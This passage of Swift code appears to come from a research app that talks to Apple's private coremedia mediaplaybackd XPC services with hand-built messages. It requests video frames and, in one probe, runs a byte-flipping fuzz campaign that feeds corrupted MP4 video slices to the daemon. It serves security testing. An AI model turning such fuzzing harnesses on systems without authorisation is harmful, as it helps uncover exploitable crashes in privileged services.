                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (ac, atok) = open("asset") else { emit("xtl: asset conn failed"); return }
        var assetOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
            original.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(ac, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xtl: crBB err=\(e)")
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetOID != 0 else { xq_release(ac); return }

        guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); return }
        var genOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
            "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
            "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
            if let r = sendSync(gc, m, timeout: 10.0) {
                genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(opts); xq_release(m)
        }
        guard genOID != 0 else { xq_release(ac); xq_release(gc); emit("xtl: no generator"); return }

        // Track timescale is 24000: request 0, 0.5s, 1s, 2s in that base.
        for t in [(0, Int64(0)), (500, Int64(12000)), (1000, Int64(24000)), (2000, Int64(48000))] {
            gotFrame.pointee = false; gotFail.pointee = false; actual.pointee = -1
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let ct = cmTime(t.1, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, ct) }
                    xq_release(ct)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xtl: req t=\(t.1)/1000 err=\(e)")
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.0)
            emit("xtl: t=\(t.1)/1000 frame=\(gotFrame.pointee) failed=\(gotFail.pointee) actual=\(actual.pointee)")
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate(); actual.deallocate()
        xq_cancel(gc); xq_release(gc)
        xq_cancel(ac); xq_release(ac)
        emit("xtl: done")
    }

    func timeDiagProbe() {
        emit("xtd: time field diagnostics")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xtd: sample missing"); return
        }
        func cmBytes(_ value: Int64, _ scale: Int32) -> [UInt8] {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b
        }
        func hex(_ b: [UInt8]) -> String { b.map { String(format: "%02x", $0) }.joined() }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let inRaw = UnsafeMutablePointer<String>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false
        inRaw.initialize(to: "none")

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") {
                    gotFrame.pointee = true
                    if let t = "ImageTime".withCString({ xq_dictionary_get_value(e, $0) }),
                       let p = xq_data_bytes(t) {
                        let n = min(xq_data_len(t), 24)
                        var arr = [UInt8](repeating: 0, count: n)
                        for k in 0..<n { arr[k] = p[k] }
                        inRaw.pointee = hex(arr)
                    }
                }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (ac, atok) = open("asset") else { emit("xtd: asset conn failed"); return }
        var assetOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
            data.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(ac, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetOID != 0 else { xq_release(ac); return }

        for (label, value) in [("t0", Int64(0)), ("t0.5", Int64(12000)),
                               ("t1", Int64(24000)), ("t12", Int64(288000))] {
            gotFrame.pointee = false; gotFail.pointee = false
            inRaw.pointee = "none"
            // Fresh generator for each request to avoid caching.
            guard let (gc, gtok) = open("assetimagegenerator") else { continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                let raw = cmBytes(value, 24000)
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                raw.withUnsafeBytes { p in
                    if let d = xq_data_create(p.baseAddress, 24) {
                        "ImageTime".withCString { xq_dictionary_set_value(m, $0, d) }
                        xq_release(d)
                    }
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                emit("xtd: [\(label)] out=\(hex(raw))")
                if let r = sendSync(gc, m, timeout: 12.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xtd: [\(label)] req err=\(e)")
                    xq_release(r)
                } else {
                    emit("xtd: [\(label)] req no reply")
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)
            emit("xtd: [\(label)] frame=\(gotFrame.pointee) failed=\(gotFail.pointee) in=\(inRaw.pointee)")
            xq_cancel(gc); xq_release(gc)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate(); inRaw.deallocate()
        xq_cancel(ac); xq_release(ac)
        emit("xtd: done")
    }

    func exactFrameProbe() {
        emit("xef: exact-time frame request")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xef: sample missing"); return
        }
        func cmBytes(_ value: Int64, _ scale: Int32) -> [UInt8] {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b
        }
        func hex(_ b: [UInt8]) -> String { b.map { String(format: "%02x", $0) }.joined() }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let inRaw = UnsafeMutablePointer<String>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false
        inRaw.initialize(to: "none")

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") {
                    gotFrame.pointee = true
                    if let t = "ImageTime".withCString({ xq_dictionary_get_value(e, $0) }),
                       let p = xq_data_bytes(t) {
                        let n = min(xq_data_len(t), 24)
                        var arr = [UInt8](repeating: 0, count: n)
                        for k in 0..<n { arr[k] = p[k] }
                        inRaw.pointee = hex(arr)
                    }
                }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (ac, atok) = open("asset") else { emit("xef: asset conn failed"); return }
        var assetOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
            data.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(ac, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetOID != 0 else { xq_release(ac); return }

        _ = 0   // tolerance values are sent as doubles
        for (label, value, exact) in [("0.5_exact", Int64(12000), true),
                                      ("0.5_loose", Int64(12000), false),
                                      ("1.0_exact", Int64(24000), true),
                                      ("2.0_exact", Int64(48000), true)] {
            gotFrame.pointee = false; gotFail.pointee = false
            inRaw.pointee = "none"
            guard let (gc, gtok) = open("assetimagegenerator") else { continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0),
               let opts = xq_dictionary_create(nil, nil, 0) {
                let raw = cmBytes(value, 24000)
                if exact {
                    // Try plain doubles for the tolerance keys.
                    "TimeToleranceBefore".withCString { xq_dictionary_set_double(opts, $0, 0.0) }
                    "TimeToleranceAfter".withCString { xq_dictionary_set_double(opts, $0, 0.0) }
                }
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                raw.withUnsafeBytes { p in
                    if let d = xq_data_create(p.baseAddress, 24) {
                        "ImageTime".withCString { xq_dictionary_set_value(m, $0, d) }
                        xq_release(d)
                    }
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xef: [\(label)] req err=\(e)")
                    xq_release(r)
                } else {
                    emit("xef: [\(label)] req no reply")
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)
            emit("xef: [\(label)] frame=\(gotFrame.pointee) failed=\(gotFail.pointee) in=\(inRaw.pointee)")
            xq_cancel(gc); xq_release(gc)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate(); inRaw.deallocate()
        xq_cancel(ac); xq_release(ac)
        emit("xef: done")
    }

    func sliceCampaignProbe() {
        emit("xsc: slice fuzz campaign")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xsc: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }
        guard let stco = findTag("stco"), let stsz = findTag("stsz") else { emit("xsc: no tables"); return }
        let offset = be32(stco + 12)
        let uniform = be32(stsz + 8)
        let size = uniform != 0 ? uniform : be32(stsz + 16)
        guard offset > 0, size > 8, offset + size <= bytes.count else { emit("xsc: bad range"); return }

        // Locate the first VCL NAL.
        var vclRel = -1, vclLen = 0
        var pos = 0
        while pos + 4 <= size {
            let len = (Int(bytes[offset + pos]) << 24) | (Int(bytes[offset + pos + 1]) << 16)
                    | (Int(bytes[offset + pos + 2]) << 8) | Int(bytes[offset + pos + 3])
            if len <= 0 || pos + 4 + len > size { break }
            let type = Int((bytes[offset + pos + 4] >> 1) & 0x3F)
            if type < 32 && vclRel < 0 { vclRel = pos; vclLen = len }
            pos += 4 + len
        }
        guard vclRel >= 0 else { emit("xsc: no VCL"); return }
        emit("xsc: vcl rel=\(vclRel) len=\(vclLen) sample=\(size)")
        let base = offset + vclRel + 4   // start of NAL header

        func rnd(_ s: inout UInt64) -> UInt64 {
            s = s &* 6364136223846793005 &+ 1442695040888963407
            return s >> 33
        }
        func build(_ region: String, _ count: Int, _ seed: UInt64) -> Data? {
            var d = bytes
            var s = seed
            switch region {
            case "hdr":
                for _ in 0..<count { d[base + Int(rnd(&s) % 2)] ^= 0xFF }
            case "head":
                for _ in 0..<count { d[base + 2 + Int(rnd(&s) % 8)] ^= 0xFF }
            case "body":
                let span = max(1, vclLen - 10)
                for _ in 0..<count { d[base + 10 + Int(rnd(&s) % UInt64(span))] ^= 0xFF }
            case "tail":
                let tail = max(1, min(32, vclLen / 4))
                for _ in 0..<count { d[base + vclLen - 1 - Int(rnd(&s) % UInt64(tail))] ^= 0xFF }
            default:
                return nil
            }
            return Data(d)
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        let plan: [(String, String, Int, UInt64)] = [
            ("hdr1", "hdr", 1, 11), ("hdr_bit", "hdr", 1, 12),
            ("head4", "head", 4, 21), ("head8", "head", 8, 22),
            ("body8", "body", 8, 31), ("body32", "body", 32, 32),
            ("body128", "body", 128, 33), ("body_s1", "body", 16, 34),
            ("tail8", "tail", 8, 41), ("tail32", "tail", 32, 42),
        ]

        for (name, region, count, seed) in plan {
            guard let payload = build(region, count, seed) else { emit("xsc: [\(name)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xsc: [\(name)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xsc: [\(name)] no asset"); xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    reqText = String(".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) })
                    xq_release(r)
                } else {
                    reqText = "none"
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 1.8)
            emit("xsc: [\(name)] req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xsc: done")
    }

    func h264Probe() {
        emit("xh264: H.264 pipeline check")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xh264: sample missing"); return
        }
        emit("xh264: sample \(data.count) bytes")

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }
        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n { h ^= UInt64(p[i]); h = h &* 0x100000001b3 }
            return h
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (ac, atok) = open("asset") else { emit("xh264: asset conn failed"); return }
        var assetOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
            data.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(ac, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xh264: crBB err=\(e) id=\(assetOID)")
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetOID != 0 else { xq_release(ac); return }

        // Track list
        if let s = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
            ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
            ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
            ".PropertyName".withCString { k in
                "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
            }
            if let r = sendSync(ac, s, timeout: 8.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xh264: Tracks err=\(e)")
                xq_release(r)
            }
            xq_release(s)
        }
        Thread.sleep(forTimeInterval: 1.0)
        let trackOID = assetOID &+ 256

        // Codec description
        if let s = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
            ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
            ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
            ".PropertyName".withCString { k in
                "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
            }
            if let r = sendSync(ac, s, timeout: 6.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                   let p = xq_data_bytes(v) {
                    let n = xq_data_len(v)
                    var head = ""
                    for i in 0..<min(16, n) { head += String(format: "%02x", p[i]) }
                    emit("xh264: FDA len=\(n) fnv=\(String(format: "%016llx", fnv(p, n))) head=\(head)")
                } else {
                    emit("xh264: FDA err=\(e)")
                }
                xq_release(r)
            }
            xq_release(s)
        }

        // Frame
        guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); return }
        var genOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
            "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
            "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
            if let r = sendSync(gc, m, timeout: 10.0) {
                genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xh264: crea err=\(e) id=\(genOID)")
                xq_release(r)
            }
            xq_release(opts); xq_release(m)
        }
        if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
            if let t = cmTime(0, 24000) {
                "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                xq_release(t)
            }
            "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
            if let r = sendSync(gc, m, timeout: 12.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xh264: req1 err=\(e)")
                xq_release(r)
            }
            xq_release(opts); xq_release(m)
        }
        Thread.sleep(forTimeInterval: 2.0)
        emit("xh264: frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
        gotFrame.deallocate(); gotFail.deallocate()
        xq_cancel(gc); xq_release(gc)
        xq_cancel(ac); xq_release(ac)
        emit("xh264: done")
    }

    func h264MapProbe() {
        emit("xhm: H.264 sample map")
        guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xhm: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
